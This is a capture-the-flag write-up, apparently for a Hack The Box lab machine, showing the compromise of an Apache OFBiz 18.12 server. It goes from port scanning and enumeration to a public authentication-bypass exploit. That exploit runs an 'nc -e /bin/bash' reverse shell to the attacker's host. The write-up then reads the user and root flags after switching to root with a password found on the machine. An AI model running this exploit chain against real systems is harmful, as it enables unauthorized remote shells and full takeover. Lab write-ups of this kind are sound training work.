# Reconnaissances
## Port Scanning
`$ sudo nmap -Pn -sC -sV 10.10.11.252`
```
Nmap scan report for 10.10.11.252
Host is up (0.026s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Did not follow redirect to https://bizness.htb/
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.07 seconds
```

### Observe the HTTP
`$ echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts`
`$ dirsearch -u https://bizness.htb/ -i 200`
```
Target: https://bizness.htb/

[08:53:32] Starting:                      
[08:54:27] 200 -   34KB - /control/      
[08:54:27] 200 -   34KB - /control
[08:54:27] 200 -   11KB - /control/login 
```

`$ firefox https://bizness.htb/control/login`
```
Copyright (c) 2001-2024 The Apache Software Foundation. Powered by Apache OFBiz. Release 18.12 
```

`$ searchsploit ofbiz`
```
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache OFBiz - Admin Creator                                                                                                              | multiple/remote/12264.txt
Apache OFBiz - Multiple Cross-Site Scripting Vulnerabilities                                                                              | php/webapps/12330.txt
Apache OFBiz - Remote Execution (via SQL Execution)                                                                                       | multiple/remote/12263.txt
Apache OFBiz 10.4.x - Multiple Cross-Site Scripting Vulnerabilities                                                                       | multiple/remote/38230.txt
Apache OFBiz 16.11.04 - XML External Entity Injection                                                                                     | java/webapps/45673.py
Apache OFBiz 16.11.05 - Cross-Site Scripting                                                                                              | multiple/webapps/45975.txt
Apache OFBiz 17.12.03 - Cross-Site Request Forgery (Account Takeover)                                                                     | java/webapps/48408.txt
ApacheOfBiz 17.12.01 - Remote Command Execution (RCE)                                                                                     | java/webapps/50178.sh
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Also refer to:
- https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
- https://github.com/K3ysTr0K3R/CVE-2023-51467-EXPLOIT

# Pre-Exploitation
Download Exploit:
`$ git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass`
```
$ python3 exploit.py --url https://bizness.htb/        
[+] Scanning started...
[+] Apache OFBiz instance seems to be vulnerable.                                                    
```

# Exploit
```
$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
```
`$ python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.14.21 9001'`
```
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

Then
```
listening on [any] 9001 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.252] 49672
id
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
cat /home/ofbiz/user.txt
d702cb639d2ce9ff550a5674c07694da
su
monkeybizness
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
28978c67263478927c6dc9cb5b141d24

```
